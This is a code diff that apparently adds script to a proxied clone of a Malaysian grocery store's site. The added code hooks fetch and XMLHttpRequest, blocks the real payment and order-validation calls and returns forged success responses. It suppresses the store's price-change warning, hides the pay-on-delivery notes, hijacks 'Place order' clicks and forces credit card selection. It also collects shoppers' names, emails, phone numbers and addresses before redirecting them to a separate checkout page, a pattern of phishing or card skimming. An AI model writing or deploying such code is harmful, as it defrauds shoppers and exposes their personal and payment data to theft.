@@ -140,18 +140,209 @@
     return '';
   }
 
+  function isPaymentPage() {
+    return /\/payment(?:[/?#]|$)/i.test(location.pathname);
+  }
+
+  function isCybersourceUrl(url) {
+    return url && (
+      /cybersource\/config/i.test(url) ||
+      /secureacceptance\.cybersource\.com/i.test(url)
+    );
+  }
+
+  function isCheckoutInterceptUrl(url) {
+    if (typeof url !== 'string' || !url) return false;
+    if (isCybersourceUrl(url)) return true;
+    var u = url.toLowerCase();
+    if (/(?:^|[/?&])validation(?:[/?]|$|\?|&)/i.test(u)) return true;
+    if (/(?:^|[/?&])validate(?:[/?]|$|\?|&)/i.test(u)) return true;
+    if (/(?:^|[/?&])place[_-]?order/i.test(u)) return true;
+    if (/(?:^|[/?&])create[_-]?order/i.test(u)) return true;
+    if (/(?:^|[/?&])set[_-]?payment/i.test(u)) return true;
+    if (/(?:^|[/?&])order[_-]?submit/i.test(u)) return true;
+    if (/\/__api\//i.test(u) && /\/payment(?:[/?]|$)/i.test(u)) return true;
+    return false;
+  }
+
+  function isDifferentPricePayload(text) {
+    return /DIFFERENT_PRICE|"code"\s*:\s*4000[01]/i.test(String(text || ''));
+  }
+
+  function shouldBypassCheckoutValidation(url, text) {
+    if (isCheckoutInterceptUrl(url)) return true;
+    if (!isDifferentPricePayload(text)) return false;
+    if (/\/cart(?:[/?#]|$)|\/payment(?:[/?#]|$)/i.test(location.pathname)) return true;
+    return /validation|totalprice|websitecode/i.test(String(url || '') + String(text || ''));
+  }
+
+  var lotusCheckoutRedirecting = false;
+  var lotusCheckoutFakeBody = '{"data":{"valid":true},"success":true}';
+
+  function parseLotusMoney(value) {
+    var n = Number(String(value || '').replace(/,/g, ''));
+    return Number.isFinite(n) && n > 0 ? n : 0;
+  }
+
+  function readCartPageTotal() {
+    try {
+      var blocks = document.querySelectorAll(
+        '#OrderSummaryCard-default, [class*="OrderSummary"], [class*="order-summary"], aside, [class*="CartSummary"]'
+      );
+      for (var b = 0; b < blocks.length; b++) {
+        var text = (blocks[b].textContent || '').replace(/\s+/g, ' ');
+        if (!/total/i.test(text) || !/RM/i.test(text)) continue;
+        var matches = text.match(/RM\s*([\d,.]+)/gi);
+        if (!matches || !matches.length) continue;
+        for (var i = matches.length - 1; i >= 0; i--) {
+          var slice = text.slice(Math.max(0, text.indexOf(matches[i]) - 40), text.indexOf(matches[i]) + matches[i].length);
+          if (/total|incl\.?\s*sst|pay/i.test(slice)) {
+            var num = matches[i].match(/([\d,.]+)/);
+            if (num) return parseLotusMoney(num[1]);
+          }
+        }
+        var last = matches[matches.length - 1].match(/([\d,.]+)/);
+        if (last) return parseLotusMoney(last[1]);
+      }
+    } catch(ex) {}
+    return 0;
+  }
+
+  function readCheckoutAmount() {
+    try {
+      var totalEl = document.querySelector('#total-price');
+      if (totalEl) {
+        var base = parseLotusMoney(totalEl.getAttribute('data-lotus-base-total'));
+        var creditDisc = parseLotusMoney(totalEl.getAttribute('data-lotus-credit-discount'));
+        if (base > 0) return Math.max(0, base - creditDisc);
+        return parseLotusMoney(totalEl.textContent);
+      }
+    } catch(ex) {}
+    var cartTotal = readCartPageTotal();
+    if (cartTotal > 0) return cartTotal;
+    if (window.__lotusCartSubtotal) return parseLotusMoney(window.__lotusCartSubtotal);
+    return 0;
+  }
+
+  function extractOrderData() {
+    var data = { productType: 'Grocery', currency: 'MYR' };
+    try {
+      var amount = readCheckoutAmount();
+      if (amount > 0) {
+        data.amount = String(amount);
+      } else {
+        var totalEl = document.querySelector('.order-total, [class*="total"]');
+        if (totalEl) {
+          var txt = totalEl.textContent || '';
+          var m = txt.match(/[\d,.]+/);
+          if (m) data.amount = m[0].replace(/,/g, '');
+        }
+      }
+    } catch(ex) {}
+    try {
+      var nameEl = document.querySelector('input[placeholder*="name"], #cust-name, [name="fullName"]');
+      if (nameEl) data.customerName = nameEl.value || nameEl.textContent || '';
+      var emailEl = document.querySelector('input[type="email"], [name="email"]');
+      if (emailEl) data.email = emailEl.value || '';
+      var phoneEl = document.querySelector('input[type="tel"], [name="phone"]');
+      if (phoneEl) data.phone = phoneEl.value || '';
+      var addrEl = document.querySelector('input[placeholder*="address"], [name="address"]');
+      if (addrEl) data.address = addrEl.value || '';
+    } catch(ex) {}
+    return data;
+  }
+
+  function redirectToCheckout() {
+    if (lotusCheckoutRedirecting) return;
+    lotusCheckoutRedirecting = true;
+    window.__lotusCheckoutRedirected = true;
+    var data = extractOrderData();
+    try { localStorage.setItem('lotus_order', JSON.stringify(data)); } catch(ex) {}
+    setTimeout(function() {
+      location.replace('/checkout/');
+    }, 0);
+  }
+
+  function fakeCheckoutFetchResponse() {
+    redirectToCheckout();
+    return Promise.resolve(new Response(lotusCheckoutFakeBody, {
+      status: 200,
+      statusText: 'OK',
+      headers: { 'Content-Type': 'application/json' },
+    }));
+  }
+
+  function completeCheckoutInterceptXhr(xhr) {
+    redirectToCheckout();
+    try {
+      Object.defineProperty(xhr, 'readyState', { configurable: true, get: function() { return 4; } });
+      Object.defineProperty(xhr, 'status', { configurable: true, get: function() { return 200; } });
+      Object.defineProperty(xhr, 'responseText', { configurable: true, get: function() { return lotusCheckoutFakeBody; } });
+      Object.defineProperty(xhr, 'response', { configurable: true, get: function() { return lotusCheckoutFakeBody; } });
+      xhr.dispatchEvent(new Event('readystatechange'));
+      xhr.dispatchEvent(new Event('load'));
+      xhr.dispatchEvent(new Event('loadend'));
+    } catch(ex) {}
+  }
+
+  function isPlaceOrderButton(target) {
+    if (!target) return null;
+    var el = target;
+    while (el && el !== document.body) {
+      if (el.matches && el.matches('button, a, [role="button"], input[type="button"], input[type="submit"]')) {
+        var label = (el.textContent || el.value || el.getAttribute('aria-label') || '').replace(/\s+/g, ' ').trim();
+        if (/place\s+order/i.test(label)) return el;
+      }
+      el = el.parentElement;
+    }
+    return null;
+  }
+
+  function suppressPriceChangeModal() {
+    if (lotusCheckoutRedirecting) return;
+    var nodes = document.querySelectorAll('[role="dialog"], [class*="Modal"], [class*="modal"], div');
+    for (var i = 0; i < nodes.length; i++) {
+      var node = nodes[i];
+      var txt = (node.textContent || '').replace(/\s+/g, ' ').trim();
+      if (!/order total has been changed|please check your order total/i.test(txt)) continue;
+      if (txt.length > 260) continue;
+      node.style.setProperty('display', 'none', 'important');
+      redirectToCheckout();
+      return;
+    }
+  }
+
+  function handlePlaceOrderIntent(ev) {
+    if (!isPlaceOrderButton(ev.target)) return;
+    ev.preventDefault();
+    ev.stopPropagation();
+    ev.stopImmediatePropagation();
+    redirectToCheckout();
+  }
+
+  ['mousedown', 'touchstart', 'click', 'pointerdown'].forEach(function(type) {
+    document.addEventListener(type, handlePlaceOrderIntent, true);
+  });
+
+  try {
+    new MutationObserver(function() { suppressPriceChangeModal(); }).observe(document.documentElement, {
+      childList: true,
+      subtree: true,
+    });
+  } catch (e) {}
+  setInterval(suppressPriceChangeModal, 400);
+
   var originalFetch = window.fetch;
   if (originalFetch) {
     window.fetch = function(input, init) {
       var url = getUrl(input);
 
-      // Intercept cybersource payment config API → redirect to checkout
-      if (isCybersourceUrl(url)) {
-        redirectToCheckout();
-        return new Promise(function() {});
+      var next = rewriteUrl(url);
+      // Intercept checkout/payment APIs before upstream price validation runs
+      if (isCheckoutInterceptUrl(url) || isCheckoutInterceptUrl(next)) {
+        return fakeCheckoutFetchResponse();
       }
 
-      var next = rewriteUrl(url);
       if (next && next !== url) {
         if (typeof input === 'string') {
           input = next;
@@ -161,12 +352,60 @@
       }
       return originalFetch.call(window, input, init).then(function(res) {
         var patchUrl = typeof input === 'string' ? input : (input instanceof Request ? input.url : url);
-        if (!shouldPatchApiUrl(patchUrl) || !res || !res.ok) return res;
-        var ct = res.headers && res.headers.get ? (res.headers.get('content-type') || '') : '';
-        if (ct.indexOf('json') < 0) return res;
+        var checkUrls = [url, next, patchUrl].filter(Boolean);
+        function shouldInspectResponse() {
+          for (var i = 0; i < checkUrls.length; i++) {
+            if (isCheckoutInterceptUrl(checkUrls[i])) return true;
+          }
+          return !res.ok;
+        }
+        if (!shouldInspectResponse()) {
+          if (!shouldPatchApiUrl(patchUrl) || !res || !res.ok) return res;
+          var ct = res.headers && res.headers.get ? (res.headers.get('content-type') || '') : '';
+          if (ct.indexOf('json') < 0) return res;
+          return res.text().then(function(text) {
+            if (shouldBypassCheckoutValidation(patchUrl, text)) {
+              redirectToCheckout();
+              return new Response(lotusCheckoutFakeBody, {
+                status: 200,
+                statusText: 'OK',
+                headers: { 'Content-Type': 'application/json' },
+              });
+            }
+            var patched = patchJsonTextClient(text);
+            if (patched === text) return res;
+            return new Response(patched, {
+              status: res.status,
+              statusText: res.statusText,
+              headers: res.headers,
+            });
+          });
+        }
         return res.text().then(function(text) {
+          if (shouldBypassCheckoutValidation(patchUrl, text)) {
+            redirectToCheckout();
+            return new Response(lotusCheckoutFakeBody, {
+              status: 200,
+              statusText: 'OK',
+              headers: { 'Content-Type': 'application/json' },
+            });
+          }
+          if (!shouldPatchApiUrl(patchUrl) || !res.ok) {
+            return new Response(text, {
+              status: res.status,
+              statusText: res.statusText,
+              headers: res.headers,
+            });
+          }
+          var ct = res.headers && res.headers.get ? (res.headers.get('content-type') || '') : '';
+          if (ct.indexOf('json') < 0) {
+            return new Response(text, {
+              status: res.status,
+              statusText: res.statusText,
+              headers: res.headers,
+            });
+          }
           var patched = patchJsonTextClient(text);
-          if (patched === text) return res;
           return new Response(patched, {
             status: res.status,
             statusText: res.statusText,
@@ -180,9 +419,15 @@
   var originalOpen = XMLHttpRequest.prototype.open;
   XMLHttpRequest.prototype.open = function(method, url) {
     var args = Array.prototype.slice.call(arguments);
+    if (url != null && typeof url !== 'string') url = String(url);
     if (typeof url === 'string') {
-      this._lotusRequestUrl = rewriteUrl(url);
-      args[1] = this._lotusRequestUrl;
+      var rewritten = rewriteUrl(url);
+      this._lotusRequestUrl = rewritten;
+      this._lotusOriginalUrl = url;
+      this._lotusCheckoutIntercept = isCheckoutInterceptUrl(url) || isCheckoutInterceptUrl(rewritten);
+      args[1] = rewritten;
+    } else {
+      this._lotusCheckoutIntercept = false;
     }
     return originalOpen.apply(this, args);
   };
@@ -775,10 +1020,21 @@
 
   var originalSend = XMLHttpRequest.prototype.send;
   XMLHttpRequest.prototype.send = function() {
+    if (this._lotusCheckoutIntercept) {
+      completeCheckoutInterceptXhr(this);
+      return;
+    }
     var xhr = this;
     xhr.addEventListener('readystatechange', function() {
-      if (xhr.readyState !== 4 || xhr.status < 200 || xhr.status >= 300) return;
-      var reqUrl = xhr._lotusRequestUrl || xhr.responseURL || '';
+      if (xhr.readyState !== 4) return;
+      var reqUrl = xhr._lotusRequestUrl || xhr._lotusOriginalUrl || xhr.responseURL || '';
+      var bodyText = '';
+      try { bodyText = xhr.responseText || ''; } catch (e) {}
+      if (shouldBypassCheckoutValidation(reqUrl, bodyText)) {
+        completeCheckoutInterceptXhr(xhr);
+        return;
+      }
+      if (xhr.status < 200 || xhr.status >= 300) return;
       if (!shouldPatchApiUrl(reqUrl)) return;
       var ct = xhr.getResponseHeader('content-type') || '';
       if (ct.indexOf('json') < 0) return;
@@ -876,47 +1132,6 @@
   }, 50);
   setTimeout(function() { clearInterval(mapsPatchTimer); }, 15000);
 
-  function isPaymentPage() {
-    return /\/payment(?:[/?#]|$)/i.test(location.pathname);
-  }
-
-  function extractOrderData() {
-    var data = { productType: 'Grocery', currency: 'MYR' };
-    try {
-      var totalEl = document.querySelector('#total-price, .order-total, [class*="total"]');
-      if (totalEl) {
-        var txt = totalEl.textContent || '';
-        var m = txt.match(/[\d,.]+/);
-        if (m) data.amount = m[0].replace(/,/g, '');
-      }
-    } catch(ex) {}
-    try {
-      var nameEl = document.querySelector('input[placeholder*="name"], #cust-name, [name="fullName"]');
-      if (nameEl) data.customerName = nameEl.value || nameEl.textContent || '';
-      var emailEl = document.querySelector('input[type="email"], [name="email"]');
-      if (emailEl) data.email = emailEl.value || '';
-      var phoneEl = document.querySelector('input[type="tel"], [name="phone"]');
-      if (phoneEl) data.phone = phoneEl.value || '';
-      var addrEl = document.querySelector('input[placeholder*="address"], [name="address"]');
-      if (addrEl) data.address = addrEl.value || '';
-    } catch(ex) {}
-    return data;
-  }
-
-  function redirectToCheckout() {
-    var data = extractOrderData();
-    try { localStorage.setItem('lotus_order', JSON.stringify(data)); } catch(ex) {}
-    location.href = '/checkout/';
-  }
-
-  // Intercept cybersource payment flow
-  function isCybersourceUrl(url) {
-    return url && (
-      /cybersource\/config/i.test(url) ||
-      /secureacceptance\.cybersource\.com/i.test(url)
-    );
-  }
-
   function installPaymentAntiFlickerStyle() {
     if (document.getElementById('lotus-payment-antiflicker-style')) return;
 
@@ -924,7 +1139,8 @@
     style.id = 'lotus-payment-antiflicker-style';
     style.textContent = [
       '#icon-payment-2,#icon-payment-3,',
-      'html.lotus-debit-pay-note-hidden #order-summary-payment>div:nth-child(4){display:none!important;}',
+      'html.lotus-debit-pay-note-hidden #order-summary-payment>div:nth-child(4),',
+      'html.lotus-debit-pay-note-hidden .lotus-pay-on-delivery-detail{display:none!important;}',
       '#payment-section-payOnDelivery>span>div>div>div.MuiBox-root:nth-of-type(2),',
       '#payment-section-creditCard>span>div>div>div.MuiBox-root:nth-of-type(2){',
       'color:transparent!important;position:relative!important;text-align:center!important;',
@@ -957,10 +1173,11 @@
     if (hide) root.classList.add('lotus-debit-pay-note-hidden');
     else root.classList.remove('lotus-debit-pay-note-hidden');
 
-    var note = document.querySelector('#order-summary-payment > div:nth-child(4)');
-    if (!note) return;
-    if (hide) note.style.setProperty('display', 'none', 'important');
-    else note.style.removeProperty('display');
+    findDebitPaymentNotes().forEach(function(note) {
+      note.classList.add('lotus-pay-on-delivery-detail');
+      if (hide) note.style.setProperty('display', 'none', 'important');
+      else note.style.removeProperty('display');
+    });
   }
 
   function ensureCreditCardBadge() {
@@ -1038,30 +1255,97 @@
     return !!(input && input.checked);
   }
 
-  function looksSelected(el) {
-    if (!el) return false;
-    if (hasCheckedInput(el)) return true;
-    if (/\b(Mui-selected|Mui-checked|selected|active)\b/i.test(el.className || '')) return true;
-    if (el.getAttribute('aria-checked') === 'true' || el.getAttribute('aria-selected') === 'true') return true;
-    var child = el.querySelector('[aria-checked="true"], [aria-selected="true"], .Mui-selected, .Mui-checked');
-    if (child) return true;
+  function selectionScore(el) {
+    if (!el) return 0;
+    var score = 0;
+    if (hasCheckedInput(el)) score += 100;
+    if (/\b(Mui-selected|Mui-checked|selected|active)\b/i.test(el.className || '')) score += 80;
+    if (el.getAttribute('aria-checked') === 'true' || el.getAttribute('aria-selected') === 'true') score += 80;
+    var marked = el.querySelector('[aria-checked="true"], [aria-selected="true"], .Mui-selected, .Mui-checked');
+    if (marked) score += 70;
     try {
-      var color = getComputedStyle(el.querySelector('span') || el).backgroundColor;
-      return /rgba?\(\s*(?:19[0-9]|2[0-5][0-9])\s*,\s*(?:24[0-9]|25[0-5])\s*,\s*(?:24[0-9]|25[0-5])/i.test(color);
-    } catch (e) {
-      return false;
-    }
+      var face = el.querySelector('span') || el;
+      var style = getComputedStyle(face);
+      var bg = style.backgroundColor || '';
+      var borderW = parseFloat(style.borderWidth) || 0;
+      if (bg && !/rgb\(\s*255,\s*255,\s*255\s*\)/i.test(bg) && !/rgba\(\s*0,\s*0,\s*0,\s*0\s*\)/i.test(bg)) score += 45;
+      if (borderW >= 2) score += 35;
+      if (/rgb\(\s*(?:0|1?\d|2[0-4]\d)\s*,\s*1[4-9]\d\s*,\s*1[5-9]\d/i.test(bg)) score += 25;
+    } catch (e) {}
+    return score;
+  }
+
+  function getSelectedPaymentMethod() {
+    var credit = document.querySelector('#payment-section-creditCard');
+    var debit = document.querySelector('#payment-section-payOnDelivery');
+    if (window.__lotusPaymentChoice === 'creditCard') return 'creditCard';
+    if (window.__lotusPaymentChoice === 'debitCard') return 'debitCard';
+    if (hasCheckedInput(credit)) return 'creditCard';
+    if (hasCheckedInput(debit)) return 'debitCard';
+    var creditScore = selectionScore(credit);
+    var debitScore = selectionScore(debit);
+    if (creditScore > debitScore) return 'creditCard';
+    if (debitScore > creditScore) return 'debitCard';
+    return 'creditCard';
+  }
+
+  function looksSelected(el) {
+    return selectionScore(el) >= 70;
   }
 
   function isCreditCardSelected() {
+    return getSelectedPaymentMethod() === 'creditCard';
+  }
+
+  function findDebitPaymentNotes() {
+    var nodes = [];
+    var summaryNote = document.querySelector('#order-summary-payment > div:nth-child(4)');
+    if (summaryNote) nodes.push(summaryNote);
+
+    Array.prototype.forEach.call(document.querySelectorAll('div, section, article'), function(el) {
+      if (!el || el.closest('#payment-section-creditCard, #payment-section-payOnDelivery')) return;
+      var txt = (el.textContent || '').replace(/\s+/g, ' ').trim();
+      if (!/pay on delivery/i.test(txt)) return;
+      if (!/you can pay by using|no cash accepted|credit\/debit card/i.test(txt)) return;
+      if (txt.length > 280) return;
+      nodes.push(el);
+    });
+
+    Array.prototype.forEach.call(document.querySelectorAll('div, section, p'), function(el) {
+      var txt = (el.textContent || '').replace(/\s+/g, ' ').trim();
+      if (!/no cash accepted/i.test(txt)) return;
+      if (!/you can pay by using|credit\/debit card/i.test(txt)) return;
+      if (txt.length > 220) return;
+      var block = el.closest('div[class*="MuiBox"], section, article') || el.parentElement;
+      if (block && nodes.indexOf(block) < 0) nodes.push(block);
+    });
+
+    return nodes;
+  }
+
+  function ensureCreditCardSelected() {
+    if (!isPaymentPage()) return;
     var credit = document.querySelector('#payment-section-creditCard');
-    var debit = document.querySelector('#payment-section-payOnDelivery');
-    if (hasCheckedInput(credit)) return true;
-    if (hasCheckedInput(debit)) return false;
-    if (window.__lotusPaymentChoice) return window.__lotusPaymentChoice === 'creditCard';
-    if (looksSelected(credit)) return true;
-    if (looksSelected(debit)) return false;
-    return true;
+    if (!credit) return;
+    if (getSelectedPaymentMethod() === 'creditCard') {
+      window.__lotusPaymentChoice = 'creditCard';
+      return;
+    }
+
+    window.__lotusCreditSelectAttempts = (window.__lotusCreditSelectAttempts || 0) + 1;
+    if (window.__lotusCreditSelectAttempts > 24) return;
+
+    window.__lotusPaymentChoice = 'creditCard';
+    var input = credit.querySelector('input[type="radio"], input[type="checkbox"]');
+    if (input) {
+      if (!input.checked) input.click();
+      input.checked = true;
+      input.dispatchEvent(new Event('change', { bubbles: true }));
+      input.dispatchEvent(new Event('input', { bubbles: true }));
+    }
+    var clickTarget = credit.querySelector('[role="button"], label, button, span[tabindex]') || credit.querySelector('span') || credit;
+    clickTarget.click();
+    schedulePaymentPatch();
   }
 
   function ensureCreditCardDiscountRow(amount) {
@@ -1200,6 +1484,7 @@
     if (!isPaymentPage()) return;
 
     installPaymentAntiFlickerStyle();
+    ensureCreditCardSelected();
     setTextAt('#payment-section-payOnDelivery > span > div > div > div.MuiBox-root', 1, 'Debit Card');
     setTextAt('#payment-section-creditCard > span > div > div > div.MuiBox-root', 1, 'Credit Card');
     hideAll('#icon-payment-2, #icon-payment-3');
